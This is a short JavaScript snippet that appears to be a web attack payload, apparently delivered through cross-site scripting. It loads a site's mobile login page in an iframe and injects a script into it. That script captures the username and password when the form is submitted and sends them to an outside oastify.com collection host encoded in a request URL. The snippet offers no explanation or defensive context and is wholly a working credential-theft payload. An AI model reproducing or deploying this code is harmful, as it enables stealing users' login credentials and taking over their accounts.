// Function to dynamically create the iframe and append it to the body
    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = "/account/login/mobile";
        iframe.id = "loginFrame";
        document.body.appendChild(iframe);
        return iframe;
    }

    var frame = createIframe();

    // Add load event listener to iframe to inject script after it loads
    frame.onload = function () {
        var doc = frame.contentDocument || frame.contentWindow.document;

        // Inject script to listen to form submission inside the iframe
        var script = doc.createElement('script');
        script.textContent = `
            function sendData(username, password) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                xhr.send();
            }

            document.body.addEventListener('submit', function(event) {
                if (event.target.tagName.toLowerCase() === 'form') {
                    var username = document.getElementsByTagName('fluent-text-field')[0].value;
                    var password = document.getElementsByTagName('fluent-text-field')[1].value;
                    sendData(username, password);
                }
            });
        `;
        doc.body.appendChild(script);
    };
